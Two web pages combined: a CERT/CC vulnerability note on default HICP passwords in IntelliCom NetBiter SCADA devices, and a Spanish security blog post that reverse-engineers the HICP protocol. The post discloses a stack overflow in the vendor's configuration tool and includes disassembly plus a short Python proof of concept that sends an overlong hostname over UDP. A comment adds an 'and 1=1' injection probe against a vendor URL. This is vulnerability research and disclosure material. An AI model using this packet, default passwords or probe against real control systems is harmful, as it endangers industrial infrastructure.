=== Content from www.kb.cert.org_6f9641ef_20250125_055459.html ===


search

menu

icon-carat-right

cmu-wordmark

* Ã—
* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* [Search](/vuls/search/)
* [Report a Vulnerability](/vuls/report/)
* [Disclosure Guidance](/vuls/guidance/)
* [VINCE](/vince/)

[[Carnegie Mellon University](https://www.cmu.edu)](https://www.cmu.edu/)

# [Software Engineering Institute](https://www.sei.cmu.edu/)

## CERT Coordination Center

* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* [Search](/vuls/search/)
* [Report a Vulnerability](/vuls/report/)
* [Disclosure Guidance](/vuls/guidance/)
* [VINCE](/vince/)

* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* Current:  VU#902793

## IntelliCom NetBiter devices have default HICP passwords

#### Vulnerability Note VU#902793

Original Release Date: 2010-04-06 | Last Revised: 2010-04-29

---

### Overview

IntelliCom NetBiter devices ship with default passwords for the HICP network configuration service. An attacker with network access could change network settings and prevent legitimate users from accessing the HICP service.

### Description

| IntelliCom NetBiter products use the proprietary HICP protocol to configure ethernet and IP network settings. NetBiter devices ship with default, well-known HICP passwords. The password is not hard-coded (persistent) as described in the original [post](http://www.reversemode.com/index.php?option=com_content&task=view&id=65&Itemid=1) by RubÃ©n Santamarta. The password is set by default but can be changed. |
| --- |

### Impact

| An attacker with network access could change network settings and prevent legitimate users from accessing the HICP service. HICP transmits the password in plain text, so the attacker may also be able to monitor HICP communication and read the changed password. |
| --- |

### Solution

| **Change default passwords**  Change the default password before deploying NetBiter devices in an production environment. Please see IntelliCom Security Bulletin [ISFR-4404-0008](http://support.intellicom.se/getfile.cfm?FID=151&FPID=113). |
| --- |

| **Restrict access**Restrict access to SCADA, DCS, and other control system networks, particularly networks using open protocols like HICP. |
| --- |

### Vendor Information

902793
Filter by status:
All
Affected
Not Affected
Unknown

Filter by content:
 Additional information available

Â Sort by:
Status
Alphabetical

Expand all

**Javascript is disabled. Click [here](/vuls/vendor/VU%23902793/) to view vendors.**
### [IntelliCom Innovation AB](#AAMN-83PNNC) Affected

Updated:Â Â April 29, 2010

### Status

Affected

### Vendor Statement

We have not received a statement from the vendor.

### Vendor Information

Please see IntelliCom Security Bulletin [ISFR-4404-0008](http://support.intellicom.se/getfile.cfm?FID=151&FPID=113).

### Vendor References

* <http://support.intellicom.se/getfile.cfm?FID=151>

### CVSS Metrics

| Group | Score | Vector |
| --- | --- | --- |
| Base |  |  |
| Temporal |  |  |
| Environmental |  |  |

### References

* <http://blog.48bits.com/?p=781>
* <http://reversemode.com/index.php?option=com_content&task=view&id=65&Itemid=1>
* <http://support.intellicom.se/getfile.cfm?FID=151>
* <http://osvdb.com/show/osvdb/61506>
### Acknowledgements

This information was published by RubÃ©n Santamarta. The default password is also documented in NetBiter user manuals. ICS-CERT researched this vulnerability and confirmed that the HICP password can be changed and is not persistent.

This document was written by Art Manion.

### Other Information

| **CVE IDs:** | [CVE-2009-4463](http://web.nvd.nist.gov/vuln/detail/CVE-2009-4463) |
| --- | --- |
| **Date Public:** | 2009-12-12 |
| **Date First Published:** | 2010-04-06 |
| **Date Last Updated:** | 2010-04-29 21:05 UTC |
| **Document Revision:** | 20 |

* [About vulnerability notes](https://vuls.cert.org/confluence/display/VIN/Vulnerability%2BNote%2BHelp)
* Contact us about this vulnerability
* [Provide a vendor statement](https://vuls.cert.org/confluence/display/VIN/Case%2BHandling#CaseHandling-Givingavendorstatusandstatement)

Sponsored by [CISA.](https://www.cisa.gov/cybersecurity)

 [Download PGP Key](https://vuls.cert.org/confluence/pages/viewpage.action?pageId=25985026)

[Read CERT/CC Blog](https://insights.sei.cmu.edu/cert/)

[Learn about Vulnerability Analysis](https://www.sei.cmu.edu/research-capabilities/all-work/display.cfm?customel_datapageid_4050=21304)

Carnegie Mellon University

Software Engineering Institute

4500 Fifth Avenue

Pittsburgh, PA 15213-2612

412-268-5800

[Office Locations](http://www.sei.cmu.edu/locations/index.cfm) | [Additional Sites Directory](http://www.sei.cmu.edu/additional-sites-directory/index.cfm) | [Legal](https://vuls.cert.org/confluence/display/VIN/VINCE%2BCode%2Bof%2BConduct#VINCECodeofConduct-TermsofUse) | [Privacy Notice](https://www.sei.cmu.edu/legal/privacy-notice/index.cfm) | [CMU Ethics Hotline](https://www.cmu.edu/hr/ethics-hotline/) | [www.sei.cmu.edu](http://www.sei.cmu.edu)

Ã‚Â©2022 Carnegie Mellon University

[Contact SEI](https://www.sei.cmu.edu/contact-us/)
#### Contact CERT/CC

 412-268-5800



=== Content from blog.48bits.com_634916c6_20250125_055458.html ===


* [48Bits Blog](https://blog.48bits.com "48Bits â€¦ The one and a half architecture land.")

  [48Bits Mail](http://mail.48bits.com/ "48Bits Mail")

---

**Random IRC quote :** *sucumbid al poder de Flankenstein*
[Con la bota de vino y el bocata salchichÃ³n, vÃ¡monos para la rooted, para la rootedcon!](https://blog.48bits.com/con-la-bota-de-vino-y-el-bocata-salchichon-vamonos-para-la-rooted-para-la-rootedcon/)
[HOYGAN LLA HES NABIDAZ? GRASIAS DE HANTEPIE.](https://blog.48bits.com/hoygan-lla-hes-nabidaz-grasias-de-hantepie/)

## [Exposing HMS HICP Protocol + 0day â€˜lightâ€™](https://blog.48bits.com/exposing-hms-hicp-protocol-0day-light/)

Hola buenas,

Hoy vamos a darle un par de vueltas a un protocolo propietario usado para configuraciÃ³n y control de ciertos dispositivos M2M de la empresa [HMS](http://www.hms.se).

AFAIK no hay documentaciÃ³n pÃºblica del protocolo HICP, si estoy equivocado que alguien me lo haga saber y me darÃ© 40 latigazos.

Bueno el caso es que como no he conseguido encontrar nada, pues escribo esto para documentarlo un poco.Obviamente lo que voy a explicar estÃ¡ basado en lo que he podido sacar destripando software y cosas peores. No tiene mucho misterio, pero como es usado en todos los productos de control y monitorizaciÃ³n industrial de la empresa HMS que incorporan capacidades de red (ethernet), creo que es interesante desde el punto de vista de la seguridad SCADA. Ya sacareÃ­s vuestras conclusiones al final del articulo.

En la segunda parte del post explicarÃ© un fallo que he encontrado en una herramienta de configuraciÃ³n de los dispositivos SCADA netbiter WS100 y WS200 de la empresa [intellicom](http://www.intellicom.se). Estos estÃ¡n basados en Anybus RemoteCOM de HMS, por lo tanto usan HICP para su configuraciÃ³n. Este fallo permite ejecutar cÃ³digo remÃ³tamente sin ningÃºn tipo de autentificaciÃ³n.

Ale, al lÃ­o!

Los dispositivos HMS-Anybus,y los que estÃ¡n basados en esta tecnologÃ­a, que incorporan capacidades ethernet necesitan una manera de configurar/actualizar lo Ã­mprescindible para ser accesibles: ip,netmask,gateway,dns,dchpâ€¦ AquÃ­ es donde entra en juego el protocolo HICP. Este es usado para poder configurar remÃ³tamente estos dispostivos. Para ello, en el [2004](http://www.hms.se/readnews.asp?NID=39) HMS publico una herramienta libre llamada Tu\_puta\_madre\_pelando\_Gambas v1.0. Jijiji, es mentira. Se llamaba [Anybus IPconfig](http://www.hms.se/upload/Anybus%20IPconfig%20setup%201_6_1_1.zip). Es una herramienta muy simple que consta de una GUI MFC y una dll llamada hicp.dll. De acuerdo con la documentaciÃ³n, esta herramienta nos permite scanear la red donde estÃ¡n conectados los dispositivos para detectarlos y configurarlos. Pues vamos a ver como lo hace.

Miramos las exports de la dll hicp.dll y vemos HICP\_SendModuleScan.

.text:100027AF ; int \_\_cdecl HICP\_SendModuleScan()

.text:100027AF Â  Â  Â  Â  Â  Â  Â  Â  public ?HICP\_SendModuleScan@@YAHXZ

.text:100027AF ?HICP\_SendModuleScan@@YAHXZ proc near

.text:100027AF Â  Â  Â  Â  Â  Â  Â  Â  push Â  Â ebp

.text:100027B0 Â  Â  Â  Â  Â  Â  Â  Â  mov Â  Â  ebp, esp

.text:100027B2 Â  Â  Â  Â  Â  Â  Â  Â  call Â  Â sub\_10002175

.text:100027B7 Â  Â  Â  Â  Â  Â  Â  Â  pop Â  Â  ebp

.text:100027B8 Â  Â  Â  Â  Â  Â  Â  Â  retn

.text:100027B8 ?HICP\_SendModuleScan@@YAHXZ endp

El cÃ³digo es una pijada

Â  sprintf(&Dest, "Module Scan");

Â  to.sa\_family = AF\_INET;

Â  \*(\_WORD \*)&to.sa\_data[0] = htons(HICP\_PORT); // 3250 UDP

Â  \*(\_DWORD \*)&to.sa\_data[2] = htonl(IP\_BROADCAST);

Â  v1 = strlen(&Dest);

Â  if ( sendto(s, &Dest, v1 + 1, 0, &to, 16) != -1 )

Pues eso manda un paquete broadcast que contiene la cadena Â«Module ScanÂ». Entonces cuando los dispositivos Anybus que tienen un daemon escuchando tambiÃ©n en el 3250 reciben esta peticiÃ³n, responden de igual manera enviando su configuraciÃ³n actual al 3250.

Vamos a ver quÃ© es lo que envian y cÃ³mo

â€”-

Â«Protocol version = 1.10; Â» # necesita explicaciÃ³n

+Â»fb type = AnybusPeralimonera; Â» # identificacion del tipo de dispositivo

+Â»module version = 0.66.6; Â» # pues eso.

+Â»mac = 00-30-11-00-BA-CA; Â» # la MAC del dispositivo -IMPORTANTE-

+Â»ip = 192.168.1.252; Â» # la ip interna

+Â»sn = 255.255.255.0; Â» # Network Mask

+Â»gw = 192.168.1.1; Â» # la puerta guay

+Â»dhcp = off; Â» # si el dispositivo usara un server DHCP para obtener la ip. (on/off)

+Â»pswd = off; Â» # si el dispositivo tiene activado un password (on/off)

+Â»hn = morroBufalo; Â» # el hostname (opcional)

+Â»dns1 = 192.168.1.33; Â» # DNS primario

+Â»dns2 = 192.168.1.34; Â» # DNS secundario (opcional)

+Â»password = limones; Â» # el password antiguo si lo queremos cambiar. (por defecto admin)

+Â»new password = peras; Â» # el nuevo password que queramos poner

â€”â€”-

Esto son los parÃ¡metros que se puede establecer/recibir mediante el protocolo HICP, los cuales se envÃ­an en una cadena en texto plano sin mÃ¡s, todo junto, separando cada parametro por Â«;Â» y usando Â«=Â» para establecerlos, tal y como vemos mÃ¡s arriba.

En el caso de que queramos configurar un dispositivo debemos aÃ±adir al principio de los parametros la siguiente cadena:

Â«Configure: %sÂ» donde %s es la MAC del dispositivo que queremos configurar. Ejemplo

Â«Configure: 00-30-11-00-BA-CA; Â«+Â»protocolâ€¦.Â»

Esto lo podemos comprobar en el export HICP\_SendConfigure de la hicp.dll.

Esta peticiÃ³n se envia al broadcast y la reciben todos los dispositivos, los cuales usaran el valor de la MAC para asegurarse que la peticiÃ³n de configuraciÃ³n les corresponde a ellos.

Los 3 primeros valores de la MAC de estos dispositivos es 00-30-11 como podemos comprobar buscando en la lista de [OUIs](http://standards.ieee.org/regauth/oui/oui.txt) a la empresa HMS.

Hay un par de respuestas mÃ¡s que envÃ­an los dispositivos en el caso de que falle el password o para avisar que se han reconfigurado corrÃ©ctamente. Â«Invalid Password:Â» y Â«Reconfigured:Â».

Pues eso es todo. Nada del otro mundo. Sin complicaciones,prÃ¡cticamente se asume que los dispositivos estÃ¡n en un lugar seguro.

SEGUNDA PARTE

Otra empresa sueca, llamada [intellicom](http://www.intellicom.se) desarrolla unos productos SCADA llamados NetBiter [WebSCADA](http://www.intellicom.se/webscada.cfm) que estÃ¡n basados en los HMS Anybus RemoteCOM.

En su pÃ¡gina web nos permiten descargar amÃ¡blemente el [firmware](http://support.intellicom.se/dynpage.cfm?FPID=85), asÃ­ como dos herramientas para [configurarlos](http://support.intellicom.se/getfile.cfm?FID=45&FPID=85) y actualizar el firmware.

Primeramente nos vamos a fijar en la herramienta para configurarlos. Vemos que es prÃ¡cticamente idÃ©ntica a la de HMS, por lo que entendemos que estÃ¡ basada en su cÃ³digo fuente. Hay algunas cosas aÃ±adidas al protocol HICP, como la capacidad de hacer un WINK a un dispositivo (Â«WINK;Â») para que se enciendan las lucecitas, lleva incorporado un servidor DHCP interno, pero por lo demÃ¡s es lo mismo. Bueno, no exactamente, tiene un buffer pequeÃ±in donde no cabe un hostname de mÃ¡s de 0x20 bytes ;).

De esta manera podemos enviar desde fuera de la red interna incluso un paquete UDP especialmente creado para hacernos pasar por un dispositivo.

![evil](http://blog.48bits.com/wp-content/uploads/2009/12/evil.png "evil")

MÃ¡s allÃ¡ de 0x20 bytes empezamos a sobreescribir los demÃ¡s valores, pudiendo llegar a sobreescribir un puntero a la vtable con los mÃ©todos de subclassing que usa la aplicaciÃ³n. Con 0x60 bytes conseguimos controlar la dereferencia de un metodo sin y que esi apunte a lo que queda de nuestro Â«hostnameÂ» (0x20 bytes aproximadamente) para poder ser usado como shellcode/stager. De esta manera conseguimos la ejecuciÃ³n de cÃ³digo.No nulls.

El fallo se activariÃ­a cuando el admin pinche sobre nuestro Â«EVIL-DEVICEÂ» para intentar configurarlo o averiguar que coÃ±o es eso.

El fallo, como suele ser habitual, es una copia de cadena a la pila sin medir el tamaÃ±o

Module: NetBiterConfig.exe

.text:00403E52 Â  Â  Â  Â  Â  Â  Â  Â  lea Â  Â  edx, [ebp-0ABh]

.text:00403E58 Â  Â  Â  Â  Â  Â  Â  Â  push Â  Â edx ; evil hostname

.text:00403E59 Â  Â  Â  Â  Â  Â  Â  Â  lea Â  Â  eax, [ebp-3CCh]

.text:00403E5F Â  Â  Â  Â  Â  Â  Â  Â  push Â  Â eax

.text:00403E60 Â  Â  Â  Â  Â  Â  Â  Â  call Â  Â strcpy

El fallo sÃ³lo se encuentra en la version de Intellicom, no en la de HMS, ya que en esta se hace un Â«strncpyÂ» a 0x80:

Module: Anybus IpConfig.exe

.text:00403691 Â  Â  Â  Â  Â  Â  Â  Â  push Â  Â 80h

.text:00403696 Â  Â  Â  Â  Â  Â  Â  Â  lea Â  Â  eax, [esp+0E1h]

.text:0040369D Â  Â  Â  Â  Â  Â  Â  Â  push Â  Â eax

.text:0040369E Â  Â  Â  Â  Â  Â  Â  Â  lea Â  Â  ecx, [esp+494h]

.text:004036A5 Â  Â  Â  Â  Â  Â  Â  Â  push Â  Â 80h

.text:004036AA Â  Â  Â  Â  Â  Â  Â  Â  push Â  Â ecx

.text:004036AB Â  Â  Â  Â  Â  Â  Â  Â  mov Â  Â  byte ptr [esp+530h], 1

.text:004036B3 Â  Â  Â  Â  Â  Â  Â  Â  call Â  Â sub\_425666

â€¦.

â€¦.

.text:004256D9 Â  Â  Â  Â  Â  Â  Â  Â  mov Â  Â  cl, [edx]

.text:004256DB Â  Â  Â  Â  Â  Â  Â  Â  mov Â  Â  [eax], cl

.text:004256DD Â  Â  Â  Â  Â  Â  Â  Â  inc Â  Â  eax

.text:004256DE Â  Â  Â  Â  Â  Â  Â  Â  inc Â  Â  edx

.text:004256DF Â  Â  Â  Â  Â  Â  Â  Â  cmp Â  Â  cl, bl

.text:004256E1 Â  Â  Â  Â  Â  Â  Â  Â  jz Â  Â  Â short loc\_4256EB

.text:004256E3 Â  Â  Â  Â  Â  Â  Â  Â  dec Â  Â  edi

.text:004256E4 Â  Â  Â  Â  Â  Â  Â  Â  jz Â  Â  Â short loc\_4256EB

.text:004256E6 Â  Â  Â  Â  Â  Â  Â  Â  dec Â  Â  [ebp+arg\_C]

.text:004256E9 Â  Â  Â  Â  Â  Â  Â  Â  jnz Â  Â  short loc\_4256D9

Otra cosa interesante de los dispositivos de Intellicom es que nos permiten descargar el [firmware](http://support.intellicom.se/getfile.cfm?FID=53&FPID=85). Este contiene una cabecera de 0x5F bytes donde se incluye un magic â€˜NBUâ€™ seguido de un major and minor version estilo ZIP, el tamaÃ±o de la imagen y un checksum.

En el offset 0x60 empieza un fichero gz tal cual, asi que si nos cepillamos la cabecera NBU podemos descomprimirlo sin mÃ¡s. Lo que nos queda es un .bin que es un linux para un Motorola ColdFire con muchas cosas interesantes, passwords por defecto incluidosâ€¦

En Shodan os podrÃ©is encontrar alguno de estos bichos. Vamos yo no lo he probado, eso me ha dicho un amigo.

Ale, fin

PoC para el fallo

â€”â€”â€”â€”-

#!/usr/bin/python

# Intellicom NetBiterConfig.exe 1.3.0 Remote Stack Overwrite.

# Ruben Santamarta â€“ www.reversemode.com

# For research purposes ONLY.

# If you use this code to cause damage Iâ€™ll cut you open like a f\*\*\*ing pig.

import sys

import socket

s = socket.socket(socket.AF\_INET,socket.SOCK\_DGRAM)

s.connect(("10.10.10.10",3250))

s.send("protocol version = 1.10; "

Â  Â  Â  Â +"fb type = EVIL-DEVICE; "

Â  Â  Â  Â +"module version = 0.66.6; "

Â  Â  Â  Â +"mac = 00-30-11-00-BA-CA; "

Â  Â  Â  Â +"ip = 192.168.1.52; "

Â  Â  Â  Â +"sn = 255.255.255.0; "

Â  Â  Â  Â +"gw = 192.168.1.1; "

Â  Â  Â  Â +"dhcp = off; "

Â  Â  Â  Â +"pswd = off; "

Â  Â  Â  Â +"hn = "+"A"\*0x60+"; "

Â  Â  Â  Â +"dns1 = 192.168.1.33;")

Por: Ruben Santamarta | [12/12/09](https://blog.48bits.com/exposing-hms-hicp-protocol-0day-light/) | [48Bits advisories](https://blog.48bits.com/category/48bits-advisories/) - [IngenierÃ­a inversa](https://blog.48bits.com/category/ingenieria-inversa/) - [Noticias](https://blog.48bits.com/category/noticias/) | [Trackback](https://blog.48bits.com/exposing-hms-hicp-protocol-0day-light/trackback/) | [Comentarios [RSS 2.0]](https://blog.48bits.com/exposing-hms-hicp-protocol-0day-light/feed/)

### 7 Comentarios para â€œExposing HMS HICP Protocol + 0day â€˜lightâ€™â€

1. [Dreg](#comment-41220)

   Comment por [Dreg](http://www.fr33project.org "Dreg") | 12/13/09 at 4:44 pm

   Muy interesante Ruben.
2. [La Nuri](#comment-41221)

   Comment por [La Nuri](http://michichiestuchichi.com "La Nuri") | 12/14/09 at 6:41 am

   Como me ponesâ€¦
3. [La Nutria Verfungen](#comment-41222)

   Comment por La Nutria Verfungen | 12/14/09 at 8:18 am

   GÃ¼iza es un notas.
4. [La Nuri](#comment-41223)

   Comment por La Nuri | 12/14/09 at 9:20 am

   Me tienes locaaa!
5. [Ruben](#comment-41300)

   Comment por Ruben | 01/10/10 at 12:01 pm

   Ya arreglaron el fallo <http://support.intellicom.se/showfile.cfm?FID=45>
6. [Miguel](#comment-41323)

   Comment por Miguel | 01/15/10 at 3:55 pm

   no, no arreglaron todoâ€¦

   <http://support.intellicom.se/showfile.cfm?FID=45> and 1=1

   ğŸ˜‰
7. [Ivan](#comment-41374)

   Comment por [Ivan](http://explotandotodo.blogspot.com/ "Ivan") | 01/28/10 at 4:03 pm

   Muy buen post â€¦

   A mi el tema de los SCADA me parece muy interesante. He trabajado desarrollando SCADAs durante unos aÃ±os, je je je ..

   Siempre observe que el tema de la seguridad brillaba por su ausencia â€¦

   Seria interesante que charlaramos, hay protocolos standar libres, que son utilizados por las casas de PLCs mas importantes y que estoy seguro que no han tenido nunca en cuenta cuestiones de seguridad. La comunicacion entre automatas, para pasar seÃ±ales (protocolo prropietario) y los servidores SCADA para telecontrol o Telemando o la funcionalidad que quieras darlos, se llega a encapsular en TCP/IP, en X.25 para emitirlo via satelite, etc, etc ..

   Un saludo.

### Se han cerrado los comentarios

48Bits Blog is proudly powered by [WordPress](http://wordpress.org "state-of-the-art semantic personal publishing platform") & [equiX](http://marcoss.com.ar/dsgn/equix/ "|X| - One Theme to Rule Them All").

Code is Poetry | [CSS](http://jigsaw.w3.org/css-validator/check/referer "Valid CSS!") | [XHTML](http://validator.w3.org/check?uri=referer "Valid XHTML 1.0!")


